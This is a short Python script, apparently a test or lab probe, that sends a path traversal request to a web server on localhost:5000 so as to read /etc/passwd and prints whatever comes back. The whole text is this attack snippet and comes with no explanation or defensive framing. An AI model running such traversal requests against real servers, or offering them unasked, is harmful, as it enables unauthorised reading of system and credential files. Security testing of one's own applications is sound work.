import requests

url = "http://localhost:5000/../../../etc/passwd"
response = requests.get(url)

print(response.text)